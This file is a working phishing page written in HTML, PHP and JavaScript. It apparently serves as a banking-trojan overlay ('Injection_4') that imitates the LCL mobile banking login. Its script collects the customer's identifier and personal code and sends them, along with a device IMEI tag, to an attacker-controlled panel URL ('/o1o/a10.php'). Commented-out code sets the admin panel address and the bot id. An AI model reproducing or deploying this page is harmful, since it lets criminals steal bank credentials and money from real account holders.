<html>
<head>
		<meta name="HandheldFriendly" content="True">
		<meta name="MobileOptimized" content="320">
		<meta name="format-detection" content="telephone=no">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"> 
		<meta http-equiv="cleartype" content="on">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;">
		<meta name="format-detection" content="telephone=no">	
		<meta name="robots" content="noindex, follow"> 
		
		<style>
		body {
			margin: 0;
			padding: 0;
		}

.input1 {
    width: 99%;
    margin-top: 10px;
    padding: 10px;
    height: 35px;
    background: transparent;
    border-top: 0 none;
    color: #394d95;
    border-left: 0 none;
    border-right: 0 none;
    border-bottom: 1px solid #394d95;
}
	.button{
    width: 99%;
    color: fff;
    font-weight: 100;
    font-size: 1.1em;
    margin-top: 10px;
    border: 0;
    background: #32aee1;
    height: 35px;
	}
	::-webkit-input-placeholder {color:#FFFFFF;font-weight: bold;}
::-moz-placeholder          {color:#FFFFFF;font-weight: bold;}/* Firefox 19+ */
:-moz-placeholder           {color:#FFFFFF;font-weight: bold;}/* Firefox 18- */
:-ms-input-placeholder      {color:#FFFFFF;font-weight: bold;}
		b{
    font-weight: bold;
    color: #394d95;
    font-size: 1.5em;
		}
		.fielderror{
    width: 99%;
    margin-top: 10px;
    padding: 10px;
    height: 35px;
    background: transparent;
    border-top: 0 none;
    color: #394d95;
    border-left: 0 none;
    border-right: 0 none;
    border-bottom: 1px solid #f00;
		}
		::-webkit-input-placeholder {color:#394d95;}
::-moz-placeholder          {color:#394d95;}/* Firefox 19+ */
:-moz-placeholder           {color:#394d95;}/* Firefox 18- */
:-ms-input-placeholder      {color:#394d95;}
		</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<center>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJYAAACWCAYAAAA8AXHiAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2RpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo2MjVEN0YwQzAzQjFFMjExQTVGRDg1REIyRENFN0I5RCIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBQjFBQTZGNEIxMEQxMUUyOTg3NUJBMkVGNzFERDI4QyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBQjFBQTZGM0IxMEQxMUUyOTg3NUJBMkVGNzFERDI4QyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MjVEN0YwQzAzQjFFMjExQTVGRDg1REIyRENFN0I5RCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MjVEN0YwQzAzQjFFMjExQTVGRDg1REIyRENFN0I5RCIvPiA8L3JkZjpEZXNjcmlwdGlv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" style="width: 100px;"><br>
</center>
<br>
<form action="null" method="post" id="_mainForm" target="flow_handler">
<input type="hidden" name="name" value="Mes Comptes - LCL pour mobile">
<center>
<b>ME CONNECTER</b>
<input name="Identifiant" placeholder="Identifiant" id="login" maxlength="10" class="input1" pattern="[0-9]*" type="text"><br>
<input name="Code personnel" placeholder="Code personnel"  id="password" maxlength="6" class="input1" pattern="[0-9]*" type="password"><br><br>

<input value="Accéder à mes comptes" id="input_submitBtn" class="button" type="button">
</center>
</form>
<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>

</div>
           <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                  /*  var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input1';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "lcl_custimerareaw'+
					'", "identifiant": "'+oNumInp.value+
					'", "code_personnel": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|lcl_custimerareaw|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>
</body>
</html>
